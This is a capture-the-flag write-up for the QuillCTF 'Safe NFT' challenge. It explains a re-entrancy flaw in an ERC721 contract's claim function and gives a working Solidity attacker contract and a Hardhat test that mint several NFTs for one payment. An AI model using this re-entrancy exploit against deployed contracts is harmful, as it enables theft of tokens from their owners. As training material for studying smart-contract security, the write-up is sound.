# QuillCTF 4: Safe NFT

**Objective of CTF:**

- Claim multiple NFTs for the price of one.

**Target contract:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract SafeNFT is ERC721Enumerable {
  uint256 price;
  mapping(address => bool) public canClaim;

  constructor(string memory tokenName, string memory tokenSymbol, uint256 _price) ERC721(tokenName, tokenSymbol) {
    price = _price; // e.g. price = 0.01 ETH
  }

  function buyNFT() external payable {
    require(price == msg.value, "INVALID_VALUE");
    canClaim[msg.sender] = true;
  }

  function claim() external {
    require(canClaim[msg.sender], "CANT_MINT");
    _safeMint(msg.sender, totalSupply());
    canClaim[msg.sender] = false;
  }
}
```

## The Attack

This contract has the good ol' re-entrancy exploit. The contract is rather innocent-looking, and the re-entrancy comes from a detail of ERC721 standard: the `onERC721Received` function.

First, what is re-entrancy? Re-entrancy is when a contract is executing a function, and before the effects of that function can take place, one can enter there again to re-execute the same function without suffering from the effects. For example, you could have a function that sends you money first, and marks the storage value `sent=true` next; you can keep recieving money by re-entering the function before `sent=true` takes place!

A similar pattern can be observed in this target contract, where `canClaim[msg.sender] = false` takes place after we actually receive our token. If this were to take place before we receive our token, re-entering the function would not work because of the `require(canClaim[msg.sender], "CANT_MINT")` requirement.

So how do we re-enter to `claim` function? That is where `onERC721Received` comes in: this function is executed if the contract supports `IERC721Receiver` interface and implements this function. Within this function, we can call `claim` again, and successfully re-enter!

We will write an attacker contract that implements `IERC721Receiver`, and write the re-enterancy logic within `onERC721Received`. We will not only re-enter, but also forward the claimed tokens to ourselves (the owner of the contract). This way, we pay the price of a single NFT but claim as many as we would like.

## Proof of Concept

The attacker contract is as follows:

```solidity
contract SafeNFTAttacker is IERC721Receiver {
  uint private claimed;
  uint private count;
  address private owner;
  SafeNFT private target;

  constructor(uint count_, address targetAddr_) {
    target = SafeNFT(targetAddr_);
    count = count_;
    owner = msg.sender;
  }

  // initiate the pwnage by purchasing a single NFT
  // we will re-enter later via onERC721Received
  function pwn() external payable {
    target.buyNFT{value: msg.value}();
    target.claim();
  }

  function claimNext() internal {
    // keep record of the current claim
    claimed++;
    // if we want to keep on claiming, continue re-entering
    // stop if you think they've had enough :)
    if (claimed != count) {
      target.claim();
    }
  }

  function onERC721Received(
    address /*operator*/,
    address /*from*/,
    uint256 tokenId,
    bytes calldata /*data*/
  ) external override returns (bytes4) {
    // forward the claimed NFT to yourself
    target.transferFrom(address(this), owner, tokenId);

    // re-enter
    claimNext();

    return IERC721Receiver.onERC721Received.selector;
  }
}
```

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```typescript
describe('QuillCTF 4: Safe NFT', () => {
  let contract: SafeNFT;
  let attackerContract: SafeNFTAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  const price = parseEther('0.1');
  const count = 3; // as many as you want

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('SafeNFT', owner).then(f => f.deploy('Safe NFT', 'SFNFT', price));
    await contract.deployed();
  });

  it('should claim multiple nfts', async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory('SafeNFTAttacker', attacker)
      .then(f => f.deploy(count, contract.address));
    await attackerContract.deployed();

    // initiate first claim and consequent re-entries via pwn
    attackerContract.pwn({value: price});

    // you should have your requested balance :)
    expect(await contract.balanceOf(attacker.address)).to.eq(count);
  });
});
```
